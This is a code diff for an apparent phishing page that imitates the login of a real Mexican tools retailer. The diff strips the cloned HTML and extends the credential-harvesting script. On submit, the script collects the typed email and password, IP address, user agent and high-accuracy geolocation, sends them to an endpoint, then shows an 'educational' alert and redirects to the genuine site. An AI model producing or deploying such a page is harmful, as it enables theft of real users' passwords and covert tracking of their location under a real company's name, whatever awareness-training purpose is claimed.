@@ -1,137 +1,12 @@
-<!DOCTYPE html>
-<html lang="en-US">
-<head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Login | Gama Consumibles Especiales</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div id="wrapwrap">
-        <header id="top">
-            <div class="container py-3 px-0">
-                <nav class="navbar navbar-expand-lg navbar-light o_colored_level o_cc o_full_border d-none d-lg-block rounded-pill py-2 px-3 shadow-sm">
-                    <div id="o_main_nav" class="container">
-                        <!-- Logo -->
-                        <a href="/en" class="navbar-brand logo me-4">
-                            <span role="img" aria-label="Logo of Gama Consumibles Especiales" title="Gama Consumibles Especiales">
-                                <img src="https://www.gamaconsumibles.com.mx/web/image/website/1/logo/Gama%20Consumibles%20Especiales?unique=33f7399" 
-                                     class="img img-fluid" width="95" height="40" alt="Gama Consumibles Especiales">
-                            </span>
-                        </a>
-                        
-                        <!-- Main Navigation -->
-                        <ul id="top_menu" role="menu" class="nav navbar-nav me-auto">
-                            <li class="nav-item dropdown">
-                                <a data-bs-toggle="dropdown" href="#" class="nav-link dropdown-toggle">
-                                    <span>Categorías</span>
-                                </a>
-                                <ul role="menu" class="dropdown-menu">
-                                    <li><a href="/en/shop/category/maquinas-para-soldar-296" class="dropdown-item">Máquinas para soldar</a></li>
-                                    <li><a href="/en/shop/category/herramienta-manual-293" class="dropdown-item">Herramienta Manual</a></li>
-                                    <li><a href="/en/shop/category/herramienta-electrica-292" class="dropdown-item">Herramienta Eléctrica</a></li>
-                                    <li><a href="/en/shop/category/consumibles-de-soldadura-y-corte-291" class="dropdown-item">Accesorios para cortar y soldar</a></li>
-                                    <li><a href="/en/shop/category/abrasivo-286" class="dropdown-item">Abrasivos</a></li>
-                                    <li><a href="/en/shop/category/equipo-de-seguridad-287" class="dropdown-item">Equipo de Protección</a></li>
-                                    <li><a href="/en/shop" class="dropdown-item">Todo</a></li>
-                                </ul>
-                            </li>
-                            <li class="nav-item">
-                                <a href="/en/sucursales" class="nav-link">sucursales</a>
-                            </li>
-                        </ul>
-                        
-                        <!-- Right Side Navigation -->
-                        <ul class="navbar-nav align-items-center gap-1 flex-wrap flex-shrink-0 justify-content-end">
-                            <li class="nav-item">
-                                <a href="#" class="btn rounded-circle p-1 lh-1 o_navlink_background text-reset">
-                                    <span class="oi oi-search fa-stack lh-lg"></span>
-                                </a>
-                            </li>
-                            
-                            <li class="nav-item o_header_language_selector">
-                                <div class="js_language_selector dropdown">
-                                    <button type="button" class="btn border-0 dropdown-toggle btn-outline-secondary d-flex align-items-center gap-1 border-0 rounded-pill px-3">
-                                        <span class="align-middle small">English (US)</span>
-                                    </button>
-                                    <div class="dropdown-menu dropdown-menu-end">
-                                        <a class="dropdown-item active" href="/web/login">English (US)</a>
-                                        <a class="dropdown-item" href="/web/login">Español (MX)</a>
-                                    </div>
-                                </div>
-                            </li>
-                            
-                            <li class="nav-item o_no_autohide_item">
-                                <a href="/web/login" class="btn btn-outline-secondary rounded-pill px-3">Sign in</a>
-                            </li>
-                        </ul>
-                    </div>
-                </nav>
-            </div>
-        </header>
-
-        <!-- Resto del código del login se mantiene igual -->
-        <main>
-            <div class="oe_website_login_container">
-                <form class="oe_login_form" role="form" method="post" id="phishing-login-form">
-                    <div class="mb-3 field-login">
-                        <label for="login" class="form-label">Email</label>
-                        <input type="text" placeholder="Email" name="login" id="login" required class="form-control">
-                    </div>
-
-                    <div class="mb-3">
-                        <label for="password" class="form-label">Password</label>
-                        <input type="password" placeholder="Password" name="password" id="password" required class="form-control">
-                    </div>
-
-                    <div class="clearfix oe_login_buttons text-center gap-1 d-grid mb-1 pt-3">
-                        <button type="submit" class="btn btn-primary">Log in</button>
-                        <div class="justify-content-between mt-2 d-flex small">
-                            <a href="/web/signup">Don't have an account?</a>
-                            <a href="/web/reset_password">Reset Password</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </main>
-
-        <footer class="o_footer o_colored_level o_cc">
-            <div class="o_footer_copyright o_colored_level o_cc">
-                <div class="container py-3">
-                    <div class="row">
-                        <div class="col-sm text-center text-sm-start text-muted">
-                            <div class="js_language_selector d-print-none">
-                                <div class="list-inline">
-                                    <a class="js_change_lang active list-inline-item" href="/web/login">English (US)</a>
-                                    <span class="list-inline-item">|</span>
-                                    <a class="js_change_lang list-inline-item" href="/web/login">Español (MX)</a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-sm text-center text-sm-end">
-                            <div class="o_brand_promotion">
-                                Powered by 
-                                <a target="_blank" class="badge text-bg-light" href="http://www.odoo.com">
-                                    <img alt="Odoo" src="https://www.gamaconsumibles.com.mx/web/static/img/odoo_logo_tiny.png" 
-                                         width="62" height="20" style="width: auto; height: 1em; vertical-align: baseline;">
-                                </a>
-                                - 
-                                The #1 <a target="_blank" href="http://www.odoo.com/app/ecommerce">Open Source eCommerce</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </footer>
-    </div>
-
 <script>
 document.getElementById('phishing-login-form').addEventListener('submit', async function(e) {
     e.preventDefault();
     
     const email = document.getElementById('login').value;
     const password = document.getElementById('password').value;
+    
+    // Obtener ubicación
+    const location = await getLocation();
     
     // Datos a enviar al endpoint
     const formData = {
@@ -140,7 +15,10 @@ document.getElementById('phishing-login-form').addEventListener('submit', async 
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
         page: 'gama-login-phishing',
-        ip: await getIPAddress()
+        ip: await getIPAddress(),
+        latitude: location.latitude,
+        longitude: location.longitude,
+        accuracy: location.accuracy
     };
     
     try {
@@ -165,6 +43,36 @@ document.getElementById('phishing-login-form').addEventListener('submit', async 
     // Mostrar mensaje educativo (siempre se ejecuta)
     showEducationalAlert(email, password);
 });
+
+// Función para obtener la ubicación
+function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            console.log('Geolocalización no soportada');
+            resolve({ latitude: null, longitude: null, accuracy: null });
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                });
+            },
+            (error) => {
+                console.log('Error obteniendo ubicación:', error.message);
+                resolve({ latitude: null, longitude: null, accuracy: null });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000, // 10 segundos
+                maximumAge: 60000 // 1 minuto
+            }
+        );
+    });
+}
 
 // Función para obtener la dirección IP
 async function getIPAddress() {
@@ -196,6 +104,4 @@ function showEducationalAlert(email, password) {
         window.location.href = 'https://www.gamaconsumibles.com.mx/en/web/login';
     }, 1000);
 }
-    </script>
-</body>
-</html>
+</script>
